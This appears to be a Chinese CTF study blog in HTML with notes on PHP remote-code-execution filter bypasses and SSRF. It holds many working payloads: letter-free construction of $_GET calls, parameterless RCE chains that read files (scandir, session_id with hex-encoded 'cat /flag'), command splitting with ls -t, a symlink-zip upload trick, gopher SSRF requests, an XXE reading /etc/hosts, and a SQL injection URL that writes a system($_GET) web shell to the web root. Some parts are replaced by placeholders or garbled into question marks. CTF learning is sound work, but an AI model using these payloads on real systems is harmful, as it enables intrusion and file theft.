-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;</span><br><span class="line">$_=[].&#x27;&#x27;;</span><br><span class="line">var_dump($_);成功获取到了字符`Array`</span><br></pre></td></tr></table></figure>
-<p>然后我们获取想获取A的话，就可以采用<code>$_[0]</code>这种方式来获取，但我们是不能够写数字的，所以我们这里可以用一个判断,比如我们在<code>[]</code>里加一个<code>==$</code>，此时因为<code>空</code>和<code>$</code>不同，它就会输出<code>0</code>，此时也就等同于<code>$_[0]</code>，具体实现代码如下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;</span><br><span class="line">$_=[];</span><br><span class="line">$_=$_[&#x27;&#x27;==&#x27;$&#x27;];</span><br><span class="line">echo $_;</span><br></pre></td></tr></table></figure>
-<p>或者<br><img src="/images/rce/pasted-image-20260307065339.png" alt="Pasted image 20260307065339"><br>构造<code>$_GET[1]($_GET[0])</code>，这个时候我们就可以<code>system(ls)</code>这种命令的执行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;</span><br><span class="line">$_=[].&#x27;&#x27;;//Array</span><br><span class="line">$_=$_[&#x27;&#x27;==&#x27;$&#x27;];//A</span><br><span class="line">$_++;//B</span><br><span class="line">$_++;//C</span><br><span class="line">$_++;//D</span><br><span class="line">$_++;//E</span><br><span class="line">$__=$_;//E</span><br><span class="line">$_++;//F</span><br><span class="line">$_++;//G</span><br><span class="line">$___=$_;//G</span><br><span class="line">$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;//T</span><br><span class="line">$_=$___.$__.$_;//GET</span><br><span class="line">//var_dump($_);</span><br><span class="line">$_=&#x27;_&#x27;.$_;//_GET</span><br><span class="line">var_dump($$_[_]($$_[__]));</span><br><span class="line">//$_GET[_]($_GET[__])</span><br></pre></td></tr></table></figure>
-<p>接下来就可以尝试去给<code>_</code>和<code>__</code>GET传参，这里我们需要把换行的都去掉，然后进行一次URL编码，因为中间件会解码一次，所以我们构造的payload先变成这样</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_=[].&#x27;&#x27;;$_=$_[&#x27;&#x27;==&#x27;$&#x27;];$_++;$_++;$_++;$_++;$__=$_;$_++;$_++;$___=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_=$___.$__.$_;$_=&#x27;_&#x27;.$_;$$_[_]($$_[__]);</span><br></pre></td></tr></table></figure>
-<p>而后变成</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%24_%3D%5B%5D.&#x27;&#x27;%3B%24_%3D%24_%5B&#x27;&#x27;%3D%3D&#x27;%24&#x27;%5D%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24___%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24___.%24__.%24_%3B%24_%3D&#x27;_&#x27;.%24_%3B%24%24_%5B_%5D(%24%24_%5B__%5D)%3B</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="无参RCE"><a href="#无参RCE" class="headerlink" title="无参RCE"></a>无参RCE</h2><h3 id="题目特征"><a href="#题目特征" class="headerlink" title="题目特征"></a>题目特征</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;</span><br></pre></td></tr></table></figure>
-<p>原理解释</p>
-<ol>
-<li>它使用正则表达式 <code>/[^\W]+\((?R)?\)/</code> 来匹配并替换掉 <code>$_GET[&#39;star&#39;]</code> 中的某些部分</li>
-</ol>
-<PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY>
-3. 这实际上是一个无参数RCE的场景，因为正则表达式限制了函数调用必须不包含参数
-
-<p>正则表达式解释：</p>
-<ul>
-<li><code>[^\W]+</code>：匹配一个或多个字母、数字或下划线（即函数名）</li>
-<li><code>\(</code> 和 <code>\)</code>：匹配左右括号</li>
-<li><code>(?R)?</code>：这是递归匹配，允许嵌套的函数调用，例如 <code>a(b())</code> 这样的形式</li>
-<li>整个正则表达式会匹配类似 <code>function()</code> 或 <code>function(anotherFunction())</code> 这样的模式，但不允许 <code>function(&#39;parameter&#39;)</code> 这样的带参数的调用</li>
-</ul>
-<p>所以，这个过滤机制允许的输入形式是：</p>
-<ul>
-<li><code>function()</code></li>
-<li><code>function(anotherFunction())</code></li>
-<li><code>function1(function2(function3()))</code></li>
-</ul>
-<p>而禁止的形式是：</p>
-<ul>
-<li><code>function(&#39;text&#39;)</code></li>
-<li><code>function(123)</code></li>
-<li><code>function($variable)</code></li>
-</ul>
-<p>无参数RCE的核心是：如何在不使用任何字面量参数（如字符串、数字）的情况下，通过函数之间的嵌套调用来构造攻击载荷，最终实现远程代码执行或文件读取。</p>
-<h3 id="相关函数简要介绍："><a href="#相关函数简要介绍：" class="headerlink" title="相关函数简要介绍："></a>相关函数简要介绍：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">scandir() :将返回当前目录中的所有文件和目录的列表。返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称（glob()可替换）</span><br><span class="line">localeconv() ：返回一包含本地数字及货币格式信息的数组。（但是这里数组第一项就是‘.’，这个.的用处很大）</span><br><span class="line">current() ：返回数组中的单元，默认取第一个值。pos()和current()是同一个东西</span><br><span class="line">getcwd() :取得当前工作目录</span><br><span class="line">dirname():函数返回路径中的目录部分</span><br><span class="line">array_flip() :交换数组中的键和值，成功时返回交换后的数组</span><br><span class="line">array_rand() :从数组中随机取出一个或多个单元</span><br><span class="line"></span><br><span class="line">array_reverse():将数组内容反转</span><br><span class="line"></span><br><span class="line">strrev():用于反转给定字符串</span><br><span class="line"></span><br><span class="line">getcwd()：获取当前工作目录路径</span><br><span class="line"></span><br><span class="line">dirname() ：函数返回路径中的目录部分。</span><br><span class="line">chdir() ：函数改变当前的目录。</span><br><span class="line"></span><br><span class="line">&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;</span><br><span class="line"></span><br><span class="line">hightlight_file()、show_source()、readfile()：读取文件内容</span><br><span class="line"></span><br><span class="line">举个例子scandir(&#x27;.&#x27;)是返回当前目录,虽然我们无法传参，但是由于localeconv() 返回的数组第一个就是‘.’，current()取第一个值，那么current(localeconv())就能构造一个‘.’,那么以下就是一个简单的返回查看当前目录下文件的payload：</span><br><span class="line"></span><br><span class="line">?参数=var_dump(scandir(current(localeconv())));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h3 id="数组移动"><a href="#数组移动" class="headerlink" title="数组移动"></a>数组移动</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">end() ： 将内部指针指向数组中的最后一个元素，并输出</span><br><span class="line">next() ：将内部指针指向数组中的下一个元素，并输出</span><br><span class="line">prev() ：将内部指针指向数组中的上一个元素，并输出</span><br><span class="line">reset() ： 将内部指针指向数组中的第一个元素，并输出</span><br><span class="line">each() ： 返回当前元素的键名和键值，并将内部指针向前移动</span><br></pre></td></tr></table></figure>
-<h3 id="scandir-文件读取函数"><a href="#scandir-文件读取函数" class="headerlink" title="scandir()文件读取函数"></a>scandir()文件读取函数</h3><p>[GXYCTF 2019]禁止套娃<br>源码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;</span><br><span class="line"> 2 include &quot;flag.php&quot;;</span><br><span class="line"> 3 echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line"> 4 if(isset($_GET[&#x27;exp&#x27;]))&#123;</span><br><span class="line"> 5     if (!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line"> 6         if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line"> 7             if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line"> 8                 // echo $_GET[&#x27;exp&#x27;];</span><br><span class="line">&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;</span><br><span class="line">10             &#125;</span><br><span class="line">11             else&#123;</span><br><span class="line">12                 die(&quot;还差一点哦！&quot;);</span><br><span class="line">13             &#125;</span><br><span class="line">14         &#125;</span><br><span class="line">15         else&#123;</span><br><span class="line">16             die(&quot;再好好想想！&quot;);</span><br><span class="line">17         &#125;</span><br><span class="line">18     &#125;</span><br><span class="line">19     else&#123;</span><br><span class="line">20         die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">21     &#125;</span><br><span class="line">22 &#125;</span><br><span class="line">23 // highlight_file(__FILE__);</span><br><span class="line">24 ?&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>
-<p><img src="/images/rce/pasted-image-20260215193238.png" alt="Pasted image 20260215193238"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
-<p>通过读取倒数第二个得到flag</p>
-<p>或者</p>
-<blockquote>
-<p>array_rand(): 从数组中取出一个或者多个单元，并且返回随机条目的一个或者多个键。<br>array_flip()：读取当前目录的键和值进行交换，如果失败返回 NULL。</p>
-<p>array_flip()和array_rand()配合使用可随机返回当前目录下的文件名。因为其中的键可以利用随机数函数array_rand()，进行随机生成。</p>
-</blockquote>
-<p>payload:（多发几次，随机返回当前目录下的文件内容，会返回flag的）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?var=show_source(array_rand(array_flip(scandir(getcwd()))));</span><br></pre></td></tr></table></figure>
-
-<h3 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a>session_id()</h3><p>使用条件：当请求头中有cookie时（或者走投无路手动添加cookie头也行，有些CTF题不会卡）</p>
-<p>首先我们需要开启session_start()​来保证session_id()的使用，session_id​可以用来获取当前会话ID，也就是说它可以抓取PHPSESSID后面的东西，但是phpsession不允许()出现<br>源码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$tgctf2025=$_GET[&#x27;tgctf2025&#x27;];</span><br><span class="line"></span><br><span class="line">if(!preg_match(&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|split|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|dir|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop|rand|flip|flip|rand|content|echo|readfile|highlight|show|source|file|assert/i&quot;, $tgctf2025))&#123;</span><br><span class="line">    //hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi</span><br><span class="line">&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?参数=session_start();system(hex2bin(session_id()));</span><br><span class="line">PHPSESSID=636174202f666c6167     //cat /flag的十六进制</span><br></pre></td></tr></table></figure>
-
-<h3 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h3><p>getallheaders()返回当前请求的所有请求头信息，局限于Apache（apache_request_headers()和getallheaders()功能相似，可互相替代，不过也是局限于Apache）</p>
-<p>当确定能够返回时，我们就能在数据包最后一行加上一个请求头，写入恶意代码，再用end()函数指向最后一个请求头，使其执行，payload：</p>
-<p>var_dump(end(getallheaders()));</p>
-<h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h3><p><strong>特点</strong>：比getallheaders()更具普遍性，可获取所有全局变量。</p>
-<p><strong>工作原理</strong>：</p>
-<ul>
-<li>返回包含所有全局变量的数组，顺序为：<code>$_GET</code> → <code>$_POST</code> → <code>$_COOKIE</code> → <code>$_FILES</code></li>
-<li>通过操作这些变量，可以实现无参数RCE</li>
-</ul>
-<p><strong>利用步骤</strong>：</p>
-<ol>
-<li>首先确认回显：<code>print_r(get_defined_vars())</code></li>
-<li>添加额外参数传递恶意代码：</li>
-</ol>
-  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;</span><br><span class="line">  ```   </span><br><span class="line">3. 也可将eval替换为assert，同样能执行命令</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 长度限制 </span><br><span class="line">### 7</span><br><span class="line">![Pasted image 20260307070940](/images/rce/pasted-image-20260307070940.png)</span><br><span class="line"></span><br><span class="line">### 5</span><br><span class="line">![Pasted image 20260307072922](/images/rce/pasted-image-20260307072922.png)</span><br><span class="line">![Pasted image 20260307073739](/images/rce/pasted-image-20260307073739.png)</span><br><span class="line"></span><br><span class="line">### 4</span><br><span class="line">![Pasted image 20260307075126](/images/rce/pasted-image-20260307075126.png)</span><br><span class="line">![Pasted image 20260307075156](/images/rce/pasted-image-20260307075156.png)</span><br><span class="line">![Pasted image 20260307075620](/images/rce/pasted-image-20260307075620.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### ：linux中的 &gt; 符号和 &gt;&gt; 符号</span><br><span class="line"></span><br><span class="line">1.通过&gt;来创建文件</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>test.txt<br>ls</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">2.通过&gt;将命令执行的结果存入文件中</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>echo “hello world”&gt;test</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line">但是通过&gt;来将命令执行结果写入文件会覆盖掉文件原本的内容，如果我们想要在原本文件内容后面追加内容就要使用&gt;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>echo “aaa”&gt;test<br>cat test<br>echo “bbb”&gt;&gt;test<br>cat test</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">### linux中命令换行</span><br><span class="line"></span><br><span class="line">在linux中，当我们执行文件中的命令的时候，我们通过在没有写完的命令后面加 &quot;\&quot;，可以将一条命令写在多行  </span><br><span class="line">比如我们有一个test文件内容如下：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>ec<br>ho <br>hello <br>world!</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">然后我们用sh命令来执行一下：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>sh test</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">成功输出了 hello world!</span><br><span class="line"></span><br><span class="line">### ls -t命令</span><br><span class="line"></span><br><span class="line">在linux中，我们使用ls -t命令后，可以将文件名按照时间顺序排列出来（后创建的排在前面）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>touch a<br>touch b<br>touch c<br>ls -t</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">结果c b a</span><br><span class="line">### 利用ls -t 和 &gt; 以及换行符 绕过长度限制执行命令</span><br><span class="line"></span><br><span class="line">我们先看执行如下命令的结果：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>ls -t&gt;test<br>cat test</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">ls -t 命令列出文件名，然后每个文件名按行储存，如果我们将我们要执行的命令拆分为多个文件名，然后再结合命令换行，然后通过 ls -t &gt; test这样的方式再写入某个文件来运行不就可以绕过命令长度限制了吗，而且从上面我们可以看出，ls -t&gt;test的执行顺序是先创建文件test，然后执行ls -t，然后将执行结果写入test文件  </span><br><span class="line">我们可以做如下小实验：  </span><br><span class="line">比如我们要执行 echo hello world</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>“rld”<br>“wo\“<br>“llo \“<br>“he\“<br>“echo \“<br>ls -t &gt; _<br>sh _</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  最终成功的输出了 &quot;hello world</span><br><span class="line"></span><br><span class="line">## 软连接</span><br></pre></td></tr></table></figure>
-<h1 id="1-创建指向网站根目录的软链接"><a href="#1-创建指向网站根目录的软链接" class="headerlink" title="1. 创建指向网站根目录的软链接"></a>1. 创建指向网站根目录的软链接</h1><p>ln -s &#x2F;var&#x2F;www&#x2F;html www_link</p>
-<h1 id="2-压缩软链接（必须用-y-或-–symlinks）"><a href="#2-压缩软链接（必须用-y-或-–symlinks）" class="headerlink" title="2. 压缩软链接（必须用 -y 或 –symlinks）"></a>2. 压缩软链接（必须用 -y 或 –symlinks）</h1><p>zip -y slink.zip www_link</p>
-<h1 id="3-删除软链接，创建同名目录（用于第二步上传木马）"><a href="#3-删除软链接，创建同名目录（用于第二步上传木马）" class="headerlink" title="3. 删除软链接，创建同名目录（用于第二步上传木马）"></a>3. 删除软链接，创建同名目录（用于第二步上传木马）</h1><p>rm www_link<br>mkdir www_link<br><PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY></p>
-<h1 id="4-压缩目录（覆盖之前的软链接）"><a href="#4-压缩目录（覆盖之前的软链接）" class="headerlink" title="4. 压缩目录（覆盖之前的软链接）"></a>4. 压缩目录（覆盖之前的软链接）</h1><p>zip -r shell.zip www_link</p>
-<h1 id="5-先传-slink-zip，再传-shell-zip"><a href="#5-先传-slink-zip，再传-shell-zip" class="headerlink" title="5. 先传 slink.zip，再传 shell.zip"></a>5. 先传 slink.zip，再传 shell.zip</h1><h1 id="解压后-output-txt-实际落在-var-www-html-output-txt"><a href="#解压后-output-txt-实际落在-var-www-html-output-txt" class="headerlink" title="解压后 output.txt 实际落在 &#x2F;var&#x2F;www&#x2F;html&#x2F;output.txt"></a>解压后 output.txt 实际落在 &#x2F;var&#x2F;www&#x2F;html&#x2F;output.txt</h1><pre><code>
-</code></pre>
-
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/CTF/">CTF</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web??</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-SSRF" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2026/07/02/SSRF/" class="article-date">
-      <time datetime="2026-07-02T14:00:00.000Z" itemprop="datePublished">2026-07-02</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2026/07/02/SSRF/">SSRF</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <blockquote>
-<p>??????????????? CTF ??????????????<br>?????? PHP shell ???????????<code>&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;</code>?<br>?????? PHP payload ?????????<code>&lt;HEX_ENCODED_PHP_PAYLOAD_OMITTED_FOR_SAFETY&gt;</code>?<br><code>shell.php</code> ??????? <code>output.txt</code>????????????????????</p>
-</blockquote>
-<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>获取主机名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/hosts</span><br></pre></td></tr></table></figure>
-<p><img src="/images/ssrf/pasted-image-20260316181233.png" alt="Pasted image 20260316181233"></p>
-<hr>
-<p><strong><a target="_blank" rel="noopener" href="http://172.250.250.3/?id=1%27%2520union%2520select%2520NULL,NULL,NULL,%27%3C?php%2520system($_GET%5B1%5D);%2520?%3E%27%2520INTO%2520DUMPFILE%2520%27/var/www/html/output.txt%27--%2520">http://172.250.250.3?id=1&#39;%2520union%2520select%2520NULL,NULL,NULL,&#39;%3C?php%2520system($_GET[1]);%2520?%3E&#39;%2520INTO%2520DUMPFILE%2520&#39;/var/www/html/output.txt&#39;--%2520</a></strong></p>
-<h2 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h2><h3 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h3><p><img src="/images/ssrf/pasted-image-20260313115858.png" alt="Pasted image 20260313115858"></p>
-<h3 id="post"><a href="#post" class="headerlink" title="post"></a>post</h3><p>四个必须的参数即POST、Host、Content-Type和Content-Length。如果少了会报错的，而GET则不用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:80</span><br><span class="line">Content-Length: 36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">key=21ef36770f67a6ddf8809c5f14ab557f</span><br></pre></td></tr></table></figure>
-<p>1.url路径编码<br>2.二次编码，同时将<code>%0A</code>全部替换为<code>%0D%0A</code>。因为 Gopher协议包含的请求数据包中，可能包含有<code>=</code>、<code>&amp;</code>等特殊字符，避免与服务器解析传入的参数键值对混淆，所以对数据包进行 URL编码，这样服务端会把<code>%</code>后的字节当做普通字节<br>3.最终完整url</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-2cc48a18335efbf5.sandbox.ctfhub.com:10800/?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Length%253A%252036%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250A%250D%250Akey%253D21ef36770f67a6ddf8809c5f14ab557f</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>gopher协议记得在目标ip地址即host后面加一个占位符，不然会被吞掉第一个字符，推荐使用<code>_</code><br>{下划线}</p>
-</blockquote>
-<h2 id="SSRF之XXE"><a href="#SSRF之XXE" class="headerlink" title="SSRF之XXE"></a>SSRF之XXE</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE user [ </span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/hosts&quot; &gt;]&gt; </span><br><span class="line">&lt;user&gt; </span><br><span class="line">    &lt;username&gt;&amp;xxe;&lt;/username&gt; </span><br><span class="line">    &lt;password&gt;admin&lt;/password&gt; </span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure>
-
-<p>将其附加至正常抓包页面下同时删去 <code>Accept-Encoding</code> 这一行，再将整体进行双重url编码<br>接着构造gopher协议即可</p>
